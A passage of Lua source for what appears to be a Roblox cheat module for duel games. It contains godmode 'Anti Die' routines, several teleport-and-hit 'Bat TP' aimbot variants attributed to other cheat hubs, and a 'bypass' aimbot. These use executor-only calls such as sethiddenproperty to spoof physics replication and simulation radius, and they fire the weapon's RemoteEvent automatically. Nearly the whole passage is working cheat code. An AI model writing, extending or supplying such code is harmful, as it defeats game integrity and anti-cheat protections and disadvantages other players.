    if velocity.Magnitude <= 80 then return end
    local stabilized = Vector3.new(0, velocity.Y, 0)
    pcall(function() root.AssemblyLinearVelocity = stabilized end)
    pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
    pcall(function() root.Velocity = stabilized end)
    pcall(function() root.RotVelocity = Vector3.zero end)
end

function M.startAntiDie()
    -- NoxaAdapt / Haze Anti Die logic
    M.antiDieEnabled = true
    M._adDeathConns = M._adDeathConns or {}
    for _, c in ipairs(M._adDeathConns) do pcall(function() c:Disconnect() end) end
    M._adDeathConns = {}
    if M._adHeartConn then pcall(function() M._adHeartConn:Disconnect() end); M._adHeartConn = nil end
    if M._adCharConn then pcall(function() M._adCharConn:Disconnect() end); M._adCharConn = nil end

    local function protectChar(char)
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
        if not hum then return end
        pcall(function()
            hum.MaxHealth = math.huge
            hum.Health = math.huge
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
        end)
        local sc = hum.StateChanged:Connect(function(_, new)
            if not M.antiDieEnabled then return end
            if new == Enum.HumanoidStateType.Dead then
                pcall(function()
                    hum.Health = math.huge
                    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                end)
            end
        end)
        table.insert(M._adDeathConns, sc)
        local hc = hum:GetPropertyChangedSignal("Health"):Connect(function()
            if not M.antiDieEnabled then return end
            if hum.Health < hum.MaxHealth then
                pcall(function() hum.Health = math.huge end)
            end
        end)
        table.insert(M._adDeathConns, hc)
        if M._adHeartConn then pcall(function() M._adHeartConn:Disconnect() end) end
        M._adHeartConn = RunService.Heartbeat:Connect(function()
            if not M.antiDieEnabled then return end
            if hum and hum.Parent and hum.Health < hum.MaxHealth then
                pcall(function() hum.Health = math.huge end)
            end
        end)
    end

    M._adProtectCharacter = protectChar
    protectChar(player.Character)

    M._adCharConn = player.CharacterAdded:Connect(function(c)
        if not M.antiDieEnabled then return end
        task.wait(0.1)
        for _, c2 in ipairs(M._adDeathConns) do pcall(function() c2:Disconnect() end) end
        M._adDeathConns = {}
        protectChar(c)
    end)

    if M.setAntiDieVisual then pcall(function() M.setAntiDieVisual(true) end) end
end

function M.stopAntiDie()
    -- Do not stop while Bat TP requires Anti Die
    if M.batTPEnabled then
        M.antiDieEnabled = true
        return
    end
    M.antiDieEnabled = false
    for _, c in ipairs(M._adDeathConns or {}) do pcall(function() c:Disconnect() end) end
    M._adDeathConns = {}
    if M._adHeartConn then pcall(function() M._adHeartConn:Disconnect() end); M._adHeartConn = nil end
    if M._adCharConn then pcall(function() M._adCharConn:Disconnect() end); M._adCharConn = nil end
    local char = player.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function()
                hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
                hum.MaxHealth = 100
                if hum.Health > 100 then hum.Health = 100 end
            end)
        end
    end
    if M.setAntiDieVisual then pcall(function() M.setAntiDieVisual(false) end) end
end

function M.startAntiDieFling()
    M.startAntiDie()
end

function M.stopAntiDieFling()
    M.stopAntiDie()
end

function M.setAntiDieFling(on)
    if on then M.startAntiDieFling() else M.stopAntiDieFling() end
end

function M.startAntiFling()
    -- fling shield kept off; Anti Die covers death
    return
end

function M.stopAntiFling()
    return
end

function M.syncCombatAntiDie()
    local need = (M.bypassAimbotEnabled == true) or (M.autoBatEnabled == true) or (M.batTPEnabled == true)
    if need then
        M.antiDieEnabled = true
        pcall(function() M.startAntiDie() end)
        pcall(function()
            if player.Character and M._adProtectCharacter then M._adProtectCharacter(player.Character) end
        end)
    else
        pcall(function() M.stopAntiDie() end)
    end
end

function M.enableBypassGodmode()

    M.antiDieEnabled = true
    pcall(function()
        if M.startAntiDie then M.startAntiDie() end
        local char = player.Character
        if char and M._adProtectCharacter then M._adProtectCharacter(char) end
    end)
    M._bypassClearGodConns()
    local char = player.Character
    if char then M._bypassProtectCharacter(char) end
    M._bypassGodCharConn = player.CharacterAdded:Connect(function(c)
        if not M.bypassAimbotEnabled then return end
        task.wait(0.05)
        M._bypassProtectCharacter(c)
        pcall(function()
            if M._adProtectCharacter then M._adProtectCharacter(c) end
        end)
    end)

    local function safeRecoverCF(root)
        local target = M._bypassTarget
        if target and target.Parent then
            local tp = target.Position
            if tp == tp and tp.Y > -10 and math.abs(tp.X) < 1e5 and math.abs(tp.Z) < 1e5 then
                return CFrame.new(tp.X, math.max(tp.Y, 8), tp.Z)
            end
        end
        if M._bypassLastGoodCF then
            local lp = M._bypassLastGoodCF.Position
            if lp == lp and lp.Y > -10 then
                return M._bypassLastGoodCF
            end
        end
        local sp = workspace:FindFirstChildOfClass("SpawnLocation")
        if sp then
            return CFrame.new(sp.Position + Vector3.new(0, 5, 0))
        end
        local p = root and root.Position or Vector3.new(0, 30, 0)
        return CFrame.new(p.X, 30, p.Z)
    end
    M._bypassSafeRecoverCF = safeRecoverCF

    M._bypassGodConn = RunService.Heartbeat:Connect(function()
        if not M.bypassAimbotEnabled then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum then return end
        pcall(function()
            hum.BreakJointsOnDeath = false
            hum.RequiresNeck = false
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
            hum.MaxHealth = math.huge
            if hum.Health < hum.MaxHealth or hum.Health <= 0 then
                hum.Health = math.huge
            end
            hum.PlatformStand = false
            hum.Sit = false
            local st = hum:GetState()
            if st == Enum.HumanoidStateType.Dead
                or st == Enum.HumanoidStateType.Ragdoll
                or st == Enum.HumanoidStateType.FallingDown
                or st == Enum.HumanoidStateType.Physics
                or st == Enum.HumanoidStateType.Flying then
                hum.Health = math.huge
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            if root then
                local p = root.Position
                local v = root.AssemblyLinearVelocity
                local av = root.AssemblyAngularVelocity

                if v ~= v or av ~= av or math.abs(v.X) > 1e6 or math.abs(v.Y) > 1e6 or math.abs(v.Z) > 1e6 then
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                end

                if v.Magnitude > 280 or math.abs(v.Y) > 160 then
                    root.AssemblyLinearVelocity = Vector3.new(
                        math.clamp(v.X, -120, 120),
                        math.clamp(v.Y, -80, 80),
                        math.clamp(v.Z, -120, 120)
                    )
                end
                if av.Magnitude > 25 then
                    root.AssemblyAngularVelocity = Vector3.zero
                end

                local inVoid = (p.Y < -20) or (p ~= p)
                    or math.abs(p.X) > 5e4 or math.abs(p.Z) > 5e4
                    or math.abs(p.Y) > 5e4
                if inVoid then
                    local cf = safeRecoverCF(root)
                    root.CFrame = cf
                    root.AssemblyLinearVelocity = Vector3.zero
                    root.AssemblyAngularVelocity = Vector3.zero
                    hum.Health = math.huge
                    hum.PlatformStand = false
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                else

                    if p.Y > 0 and p.Y < 500 then
                        M._bypassLastGoodCF = root.CFrame
                    end
                end

                pcall(function()
                    if root:CanSetNetworkOwnership() then
                        root:SetNetworkOwner(player)
                    end
                end)
                pcall(function()
                    if sethiddenproperty then
                        sethiddenproperty(player, "MaxSimulationRadius", 1e5)
                        sethiddenproperty(player, "SimulationRadius", 1e5)
                    end
                end)
            end
        end)
    end)
end

function M.disableBypassGodmode()
    M._bypassClearGodConns()
end

-- do not force Bat TP on (respect config)
M.batTPEnabled = M.batTPEnabled == true
M._tpHitDone = false
M._tpTargetHealth = nil
M._tpTargetHum = nil
M._tpLockedRoot = nil
M._tpShieldConn = nil
M._tpAntiDieConn = nil
M._tpCharConn = nil
M._tpHitCD = false
M._tpBatHRP = nil
M._tpBatHum = nil

-- TP BAT (Horizon Duels — exact behavior)

function M._tpFindBat()
    local char = player.Character
    if not char then return nil end
    local tool = char:FindFirstChild("Bat")
    if tool then return tool end
    local bp = player:FindFirstChild("Backpack")
    if bp then
        tool = bp:FindFirstChild("Bat")
        if tool then
            tool.Parent = char -- equip by reparenting
            return tool
        end
    end
    return nil
end

function M.tpHit()
    if M._tpHitCD then return end
    M._tpHitCD = true
    pcall(function()
        local bat = M._tpFindBat()
        if bat then
            bat:Activate()
            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
            if ev then ev:FireServer() end
        end
    end)
    task.delay(0.08, function()
        M._tpHitCD = false
    end)
end

function M._tpBatGetClosestRoot()
    local hrp = M._tpBatHRP
    if not hrp then return nil, math.huge end
    local closest, minDist = nil, math.huge
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= player and p.Character then
            local tr = p.Character:FindFirstChild("HumanoidRootPart")
            if tr then
                local d = (hrp.Position - tr.Position).Magnitude
                if d < minDist then
                    minDist = d
                    closest = p
                end
            end
        end
    end
    return closest, minDist
end

local function setupCharTP(char)
    task.wait(0.1)
    M._tpBatHum = char:WaitForChild("Humanoid", 5)
    M._tpBatHRP = char:WaitForChild("HumanoidRootPart", 5)
end

function M.startBatTPAimbot()
    -- Restart when version changed so saved mode logic is always applied
    if M.batTPEnabled and M.batTPConn and M._batTPRunningVersion == tostring(M.batTPVersion or "V1") then
        return
    end
    if M.autoBatEnabled and M.stopBatAimbot then pcall(function() M.stopBatAimbot() end) end
    if M.bypassAimbotEnabled and M.stopBypassAimbot then pcall(function() M.stopBypassAimbot() end) end
    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; if M.stopAutoLeft then pcall(M.stopAutoLeft) end end
    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; if M.stopAutoRight then pcall(M.stopAutoRight) end end
    if M.batTPConn then pcall(function() M.batTPConn:Disconnect() end); M.batTPConn=nil end
    if M._batTPCharConn then pcall(function() M._batTPCharConn:Disconnect() end); M._batTPCharConn=nil end
    M.batTPEnabled = true
    M.antiDieEnabled = true
    pcall(function() if M.startAntiDie then M.startAntiDie() end end)

    local ver = tostring(M.batTPVersion or "V1")
    if ver ~= "V1" and ver ~= "V2" and ver ~= "V3" and ver ~= "V4" then
        ver = "V1"
        M.batTPVersion = "V1"
    end
    M._batTPRunningVersion = ver

    local function sharedGetBat()
        local char = player.Character
        if not char then return nil end
        local function isBat(tool)
            if not tool or not tool:IsA("Tool") then return false end
            local n = tool.Name:lower()
            return n:find("bat") or n:find("slap") or n:find("glove") or n:find("hand")
        end
        for _, tool in ipairs(char:GetChildren()) do
            if isBat(tool) then return tool end
        end
        local bp = player:FindFirstChildOfClass("Backpack") or player:FindFirstChild("Backpack")
        if bp then
            for _, tool in ipairs(bp:GetChildren()) do
                if isBat(tool) then
                    pcall(function()
                        local hum = char:FindFirstChildOfClass("Humanoid")
                        if hum then hum:EquipTool(tool) end
                    end)
                    return tool
                end
            end
        end
        return char:FindFirstChild("Bat")
    end

    local function sharedClosest()
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return nil, math.huge end
        local best, bestD = nil, math.huge
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local tr = plr.Character:FindFirstChild("HumanoidRootPart")
                if tr then
                    local d = (hrp.Position - tr.Position).Magnitude
                    if d < bestD then bestD = d; best = plr end
                end
            end
        end
        return best, bestD
    end

    local hittingCooldown = false
    local function sharedTryHit()
        if hittingCooldown then return end
        hittingCooldown = true
        pcall(function()
            local bat = sharedGetBat()
            if bat then
                bat:Activate()
                local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
                if ev then ev:FireServer() end
            end
        end)
        task.delay(0.08, function() hittingCooldown = false end)
    end

    if ver == "V1" then
        -- Horizon / original V1
        local function getClosestPlayerTP()
            local hrp = M._tpBatHRP or (player.Character and player.Character:FindFirstChild("HumanoidRootPart"))
            if not hrp then return nil, math.huge end
            local best, bestD = nil, math.huge
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= player and p.Character then
                    local tr = p.Character:FindFirstChild("HumanoidRootPart")
                    if tr then
                        local d = (hrp.Position - tr.Position).Magnitude
                        if d < bestD then bestD = d; best = p end
                    end
                end
            end
            return best, bestD
        end
        local function tpBatTick()
            if not (M.batTPEnabled and M._tpBatH and M._tpBatHRP) then return end
            local target = select(1, getClosestPlayerTP())
            if target and target.Character then
                local tr = target.Character:FindFirstChild("HumanoidRootPart")
                if tr then
                    if sethiddenproperty then pcall(function() sethiddenproperty(M._tpBatHRP, "PhysicsRepRootPart", tr) end) end
                    local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
                    if (M._tpBatHRP.Position - targetPos).Magnitude > 8 then
                        M._tpBatHRP.CFrame = CFrame.new(targetPos)
                    end
                    local cam = workspace.CurrentCamera
                    if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position) end
                    sharedTryHit()
                end
            end
        end
        M.batTPConn = RunService.Heartbeat:Connect(tpBatTick)
        local function setupCharTP(char)
            task.wait(0.1)
            local h = char:WaitForChild("Humanoid", 5)
            local hrp = char:WaitForChild("HumanoidRootPart", 5)
            if h and hrp then M._tpBatH = h; M._tpBatHRP = hrp end
        end
        M._batTPCharConn = player.CharacterAdded:Connect(function(char)
            if not M.batTPEnabled then return end
            setupCharTP(char)
        end)
        if player.Character then setupCharTP(player.Character) end

    elseif ver == "V2" then
        -- RitualHub desync TP (8 studs)
        M.batTPConn = RunService.Heartbeat:Connect(function()
            if not M.batTPEnabled then return end
            local char = player.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local target = select(1, sharedClosest())
            if target and target.Character then
                local tr = target.Character:FindFirstChild("HumanoidRootPart")
                if tr then
                    if sethiddenproperty then pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", tr) end) end
                    local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
                    if (hrp.Position - targetPos).Magnitude > 8 then
                        hrp.CFrame = CFrame.new(targetPos)
                    end
                    local cam = workspace.CurrentCamera
                    if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position) end
                    sharedTryHit()
                end
            end
        end)
        M._batTPCharConn = player.CharacterAdded:Connect(function(char)
            if not M.batTPEnabled then return end
            task.wait(0.25)
            local hrp = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 3)
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hrp and hum then M._tpBatHRP = hrp; M._tpBatH = hum end
        end)
        local char = player.Character
        if char then
            M._tpBatHRP = char:FindFirstChild("HumanoidRootPart")
            M._tpBatH = char:FindFirstChildOfClass("Humanoid")
        end

    elseif ver == "V3" then
        -- K7 Duels TP Bat logic
        pcall(function()
            local char = player.Character
            if char then
                local oldFF = char:FindFirstChild("K7TPBatFF")
                if oldFF then oldFF:Destroy() end
                local ff = Instance.new("ForceField")
                ff.Name = "K7TPBatFF"
                ff.Visible = false
                ff.Parent = char
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then
                    hum.BreakJointsOnDeath = false
                    hum.RequiresNeck = false
                    pcall(function()
                        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
                        hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
                        hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
                        hum:SetStateEnabled(Enum.HumanoidStateType.Physics, false)
                    end)
                end
            end
        end)
        M.batTPConn = RunService.Heartbeat:Connect(function()
            if not M.batTPEnabled then return end
            local char = player.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not root or not hum then return end
            pcall(function()
                local bat = sharedGetBat()
                if bat and bat.Parent ~= char then
                    pcall(function() hum:EquipTool(bat) end)
                end
            end)
            pcall(function()
                hum.MaxHealth = math.max(hum.MaxHealth, 100)
                hum.Health = hum.MaxHealth
                hum.BreakJointsOnDeath = false
                hum.RequiresNeck = false
                hum.PlatformStand = false
                hum.Sit = false
                local st = hum:GetState()
                if st == Enum.HumanoidStateType.Dead
                    or st == Enum.HumanoidStateType.Physics
                    or st == Enum.HumanoidStateType.Ragdoll
                    or st == Enum.HumanoidStateType.FallingDown then
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end
                if not char:FindFirstChild("K7TPBatFF") then
                    local ff = Instance.new("ForceField")
                    ff.Name = "K7TPBatFF"
                    ff.Visible = false
                    ff.Parent = char
                end
            end)
            local target = select(1, sharedClosest())
            if not target or not target.Character then return end
            local tr = target.Character:FindFirstChild("HumanoidRootPart")
            if not tr then return end
            pcall(function()
                if sethiddenproperty then sethiddenproperty(root, "PhysicsRepRootPart", tr) end
            end)
            local back = tr.CFrame.LookVector
            local flatBack = Vector3.new(back.X, 0, back.Z)
            local offset
            if flatBack.Magnitude < 0.05 then
                offset = Vector3.new(0, 1.2, 2.2)
            else
                offset = Vector3.new(0, 1.2, 0) - (flatBack.Unit * 2.2)
            end
            local targetPos = tr.Position + offset
            local dist = (root.Position - targetPos).Magnitude
            if dist > 10 then
                root.CFrame = CFrame.new(targetPos, tr.Position)
                root.AssemblyLinearVelocity = Vector3.zero
                root.AssemblyAngularVelocity = Vector3.zero
            elseif dist > 2.5 then
                local dir = (targetPos - root.Position)
                local flatDir = Vector3.new(dir.X, 0, dir.Z)
                if flatDir.Magnitude > 0.05 then
                    root.AssemblyLinearVelocity = flatDir.Unit * math.min(55, dist * 8)
                        + Vector3.new(0, root.AssemblyLinearVelocity.Y * 0.2, 0)
                end
                local flat = Vector3.new(tr.Position.X - root.Position.X, 0, tr.Position.Z - root.Position.Z)
                if flat.Magnitude > 0.1 then
                    root.CFrame = CFrame.new(root.Position, root.Position + flat.Unit)
                end
            else
                local flat = Vector3.new(tr.Position.X - root.Position.X, 0, tr.Position.Z - root.Position.Z)
                if flat.Magnitude > 0.1 then
                    root.CFrame = CFrame.new(root.Position, root.Position + flat.Unit)
                end
                local v = root.AssemblyLinearVelocity
                root.AssemblyLinearVelocity = Vector3.new(v.X * 0.5, math.max(v.Y, -10), v.Z * 0.5)
            end
            pcall(function()
                local cam = workspace.CurrentCamera
                if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position) end
            end)
            sharedTryHit()
            pcall(function()
                local maxLin, maxAng = 85, 15
                local v = root.AssemblyLinearVelocity
                if v.Magnitude > maxLin then
                    root.AssemblyLinearVelocity = v.Unit * maxLin
                end
                if root.AssemblyAngularVelocity.Magnitude > maxAng then
                    root.AssemblyAngularVelocity = Vector3.zero
                end
            end)
        end)
        M._batTPCharConn = player.CharacterAdded:Connect(function(char)
            if not M.batTPEnabled then return end
            task.wait(0.15)
            pcall(function()
                local oldFF = char:FindFirstChild("K7TPBatFF")
                if oldFF then oldFF:Destroy() end
                local ff = Instance.new("ForceField")
                ff.Name = "K7TPBatFF"
                ff.Visible = false
                ff.Parent = char
            end)
        end)

    else
        -- V4: Anti-Sammy / GRAPE TP Bat (distance 3)
        M.batTPConn = RunService.Heartbeat:Connect(function()
            if not M.batTPEnabled then return end
            local char = player.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
            local target = select(1, sharedClosest())
            if target and target.Character then
                local tr = target.Character:FindFirstChild("HumanoidRootPart")
                if tr then
                    if sethiddenproperty then
                        pcall(function() sethiddenproperty(hrp, "PhysicsRepRootPart", tr) end)
                    end
                    local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
                    if (hrp.Position - targetPos).Magnitude > 3 then
                        hrp.CFrame = CFrame.new(targetPos)
                    end
                    local cam = workspace.CurrentCamera
                    if cam then
                        cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position)
                    end
                    sharedTryHit()
                end
            end
        end)
        M._batTPCharConn = player.CharacterAdded:Connect(function(char)
            if not M.batTPEnabled then return end
            task.wait(0.2)
            M._tpBatHRP = char:FindFirstChild("HumanoidRootPart")
            M._tpBatH = char:FindFirstChildOfClass("Humanoid")
        end)
        local char = player.Character
        if char then
            M._tpBatHRP = char:FindFirstChild("HumanoidRootPart")
            M._tpBatH = char:FindFirstChildOfClass("Humanoid")
        end
    end

    if M.setBatTPVisual then pcall(function() M.setBatTPVisual(true) end) end
    if M.mobBtnRefs and M.mobBtnRefs.batTP then pcall(function() M.mobBtnRefs.batTP(true) end) end
end

function M.stopBatTPAimbot()
    M.batTPEnabled = false
    M._batTPRunningVersion = nil
    -- Anti Die stays only if other combat modes need it
    pcall(function()
        if M.syncCombatAntiDie then
            M.syncCombatAntiDie()
        elseif not (M.autoBatEnabled or M.bypassAimbotEnabled) then
            if M.stopAntiDie then M.stopAntiDie() end
        end
    end)
    if M.batTPConn then pcall(function() M.batTPConn:Disconnect() end); M.batTPConn=nil end
    if M._batTPCharConn then pcall(function() M._batTPCharConn:Disconnect() end); M._batTPCharConn=nil end
    pcall(function()
        local hrp = (M._tpBatHRP and M._tpBatHRP.Parent and M._tpBatHRP) or (player.Character and player.Character:FindFirstChild("HumanoidRootPart"))
        if hrp and sethiddenproperty then sethiddenproperty(hrp, "PhysicsRepRootPart", hrp) end
        local char = player.Character
        if char then
            local ff = char:FindFirstChild("K7TPBatFF")
            if ff then ff:Destroy() end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then
                pcall(function()
                    hum.BreakJointsOnDeath = true
                    hum.RequiresNeck = true
                    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
                    hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
                    hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
                    hum:SetStateEnabled(Enum.HumanoidStateType.Physics, true)
                end)
            end
        end
    end)
    M._tpBatHRP=nil; M._tpBatH=nil; M._tpBatHum=nil
    if M.setBatTPVisual then pcall(function() M.setBatTPVisual(false) end) end
    if M.mobBtnRefs and M.mobBtnRefs.batTP then pcall(function() M.mobBtnRefs.batTP(false) end) end
end

function M.toggleBatTPAimbot()
    if M.batTPEnabled then M.stopBatTPAimbot() else M.startBatTPAimbot() end
    if M.setBatTPVisual then pcall(function() M.setBatTPVisual(M.batTPEnabled) end) end
    if M.mobBtnRefs and M.mobBtnRefs.batTP then pcall(function() M.mobBtnRefs.batTP(M.batTPEnabled) end) end
    return M.batTPEnabled
end

function M.toggleBatTPAimbot()
    if M.batTPEnabled then M.stopBatTPAimbot() else M.startBatTPAimbot() end
    if M.setBatTPVisual then pcall(function() M.setBatTPVisual(M.batTPEnabled) end) end
    if M.mobBtnRefs and M.mobBtnRefs.batTP then pcall(function() M.mobBtnRefs.batTP(M.batTPEnabled) end) end
    return M.batTPEnabled
end

function M.toggleBatTPAimbot()
    if M.batTPEnabled then
        M.stopBatTPAimbot()
    else
        M.startBatTPAimbot()
    end
    if M.setBatTPVisual then pcall(function() M.setBatTPVisual(M.batTPEnabled) end) end
    if M.mobBtnRefs and M.mobBtnRefs.batTP then pcall(function() M.mobBtnRefs.batTP(M.batTPEnabled) end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
    return M.batTPEnabled
end

function M.startBypassAimbot()
    if M.safeModeTryStart and not M.safeModeTryStart() then return end
    if M.autoBatEnabled and M.stopBatAimbot then pcall(function() M.stopBatAimbot() end) end
    if M.batTPEnabled and M.stopBatTPAimbot then pcall(function() M.stopBatTPAimbot() end) end
    if M.bypassAimbotConn then pcall(function() M.bypassAimbotConn:Disconnect() end); M.bypassAimbotConn = nil end

    M._abCfg = {
        Speed = 59,
        VertSpeed = 52,
        Dist = -2.8,
        Height = 4.75,
        VertOffset = 1,
        TurnSpeed = 285,
        MaxTurnRate = 28,
    }
    M._abTarget = nil
    M._abLastScan = 0
    M._abEquipped = false

    M.autoSwingEnabled = true
    M.bypassAimbotEnabled = true

    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        pcall(function() if M.stopAutoLeft then M.stopAutoLeft() end end)
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        pcall(function() if M.stopAutoRight then M.stopAutoRight() end end)
    end
    M._autoTPWasEnabledForBypass = false
    if M.autoTPEnabled then
        M._autoTPWasEnabledForBypass = true
        pcall(function() if M.stopAutoTP then M.stopAutoTP() end end)
        if M.setAutoTPVisual then M.setAutoTPVisual(false) end
    end

    local function getAntiBypassTarget()
        local char = player.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return nil end
        local now = tick()
        if now - (M._abLastScan or 0) <= 0.1 and M._abTarget and M._abTarget.Parent then
            local hum = M._abTarget.Parent:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then return M._abTarget end
        end
        M._abLastScan = now
        M._abTarget = nil
        local closest, minDist = nil, math.huge
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if tRoot and hum and hum.Health > 0 then
                    local dist = (tRoot.Position - root.Position).Magnitude
                    if dist < minDist then
                        minDist = dist
                        closest = tRoot
                    end
                end
            end
        end
        M._abTarget = closest
        return M._abTarget
    end

    local function ensureEquipped()
        local char = player.Character
        if not char then return end
        if char:FindFirstChildOfClass("Tool") then return end
        local bp = player:FindFirstChild("Backpack")
        if not bp then return end
        local bat = bp:FindFirstChild("Bat")
        if bat then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then pcall(function() hum:EquipTool(bat) end) end
        end
    end

    local function antiBypassTick()
        if not M.bypassAimbotEnabled then return end
        local char = player.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root or not hum then return end
        local cfg = M._abCfg or {}

        if not M._abEquipped then
            M._abEquipped = true
            ensureEquipped()
        end

        local target = getAntiBypassTarget()
        if target then
            local aimTargetPos = target.Position + Vector3.new(0, cfg.VertOffset or 1, 0)
            hum.AutoRotate = false

            local look = aimTargetPos - root.Position
            local flatLook = Vector3.new(look.X, 0, look.Z)

            if look.Magnitude > 0.01 and flatLook.Magnitude > 0.01 then
                local targetYaw = math.deg(math.atan2(-flatLook.X, -flatLook.Z))
                local yawDelta = (targetYaw - root.Orientation.Y + 180) % 360 - 180
                local targetPitch = math.deg(math.atan2(look.Y, flatLook.Magnitude))
                local pitchDelta = (targetPitch - root.Orientation.X + 180) % 360 - 180

                local turn = cfg.TurnSpeed or 285
                local maxR = cfg.MaxTurnRate or 28
                local yawRate = math.clamp(math.rad(yawDelta) * turn, -maxR, maxR)
                local pitchRate = math.clamp(math.rad(pitchDelta) * turn, -maxR, maxR)
                local yawRad = math.rad(root.Orientation.Y)
                local rightAxis = Vector3.new(math.cos(yawRad), 0, -math.sin(yawRad))

                root.AssemblyAngularVelocity = Vector3.new(0, yawRate, 0) + (rightAxis * pitchRate)
            else
                root.AssemblyAngularVelocity = Vector3.zero
            end

            local dir = look.Magnitude > 0.01 and look.Unit or Vector3.zero
            local standPos = aimTargetPos - (dir * (cfg.Dist or -2.8)) + Vector3.new(0, cfg.Height or 4.75, 0)
            local moveDir = standPos - root.Position
            local hDir = Vector3.new(moveDir.X, 0, moveDir.Z)
            local hVel = hDir.Magnitude > 0.1 and hDir.Unit * (cfg.Speed or 59) or Vector3.zero
            local vVel = math.abs(moveDir.Y) > 0.1
                and Vector3.new(0, math.sign(moveDir.Y) * (cfg.VertSpeed or 52), 0)
                or Vector3.new(0, -2, 0)

            root.Velocity = hVel + vVel
            if hDir.Magnitude > 0.5 then hum:Move(hDir.Unit, false) end

            if M.autoSwingEnabled ~= false then
                local bat = char:FindFirstChild("Bat")
                if bat and bat:IsA("Tool") then
                    pcall(function() bat:Activate() end)
                end
            end
        else
            hum.AutoRotate = true
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end

    M.bypassAimbotConn = RunService.Heartbeat:Connect(antiBypassTick)

    if M.setBypassVisual then pcall(function() M.setBypassVisual(true) end) end
    if M.mobBtnRefs and M.mobBtnRefs.bypass then pcall(function() M.mobBtnRefs.bypass(true) end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.stopBypassAimbot()
    M.bypassAimbotEnabled = false
    if M.bypassAimbotConn then
        pcall(function() M.bypassAimbotConn:Disconnect() end)
        M.bypassAimbotConn = nil
    end
    M._abTarget = nil
    M._abEquipped = false

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if root then
        pcall(function()
            root.Velocity = root.Velocity * 0.3
            root.AssemblyAngularVelocity = Vector3.zero
        end)
    end
    if hum then
        hum.AutoRotate = true
    end

    if M._autoTPWasEnabledForBypass then
        M._autoTPWasEnabledForBypass = false
        M.autoTPEnabled = true
        if M.setAutoTPVisual then M.setAutoTPVisual(true) end
        pcall(function() if M.startAutoTP then M.startAutoTP() end end)
    end

    if M.setBypassVisual then pcall(function() M.setBypassVisual(false) end) end
    if M.mobBtnRefs and M.mobBtnRefs.bypass then pcall(function() M.mobBtnRefs.bypass(false) end) end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
end

function M.toggleBypassAimbot()
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
    else
        M.startBypassAimbot()
    end
    if M.setBypassVisual then
        M.setBypassVisual(M.bypassAimbotEnabled)
    end
    if M.mobBtnRefs and M.mobBtnRefs.bypass then
        M.mobBtnRefs.bypass(M.bypassAimbotEnabled)
    end
    pcall(function() if saveCherryConfig then saveCherryConfig() end end)
